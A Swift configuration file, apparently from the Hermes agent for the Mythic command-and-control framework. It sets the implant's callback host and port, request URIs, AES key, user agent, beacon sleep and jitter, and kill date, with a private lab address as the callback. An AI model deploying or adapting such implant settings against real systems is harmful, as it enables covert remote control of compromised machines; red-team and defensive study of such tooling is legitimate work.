//
//  config.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

struct AgentConfig {
    // Mythic components
    var payloadUUID: String
    var encodedAESKey: String
    
    // C2 components
    var callbackHost: String
    var getRequestURI: String
    var postRequestURI: String
    var callbackPort: Int
    var userAgent: String
    var hostHeader: String
    var useSSL: Bool
    var queryParameter: String
    var httpHeaders: Dictionary<String,String>
    
    // Agent components
    var sleep: Int32
    var jitter: Int32
    var killDate: String //year-month-day, ex. 1994-01-05
}

var agentConfig = AgentConfig(
    payloadUUID: "2e11f9ce-d0e9-4fd9-a430-ad13a36c0a9f",
    encodedAESKey: "7hJCPdER9+t3q3K5q3erbK/8H+co3Nat8uay3suFMu4=",

    callbackHost: "192.168.196.3",
    getRequestURI: "/index",
    postRequestURI: "/data",
    callbackPort: 80,
    userAgent: "Hermes user agent",
    hostHeader: "",
    useSSL: false,
    queryParameter: "q",
    httpHeaders: ["key1":"value1","key2":"value2"], //use [:] for empty, so config.swift.bak might be REPLACE_HTTP_HEADERS:

    sleep: 5,
    jitter: 5,
    killDate: "2022-05-01"
)
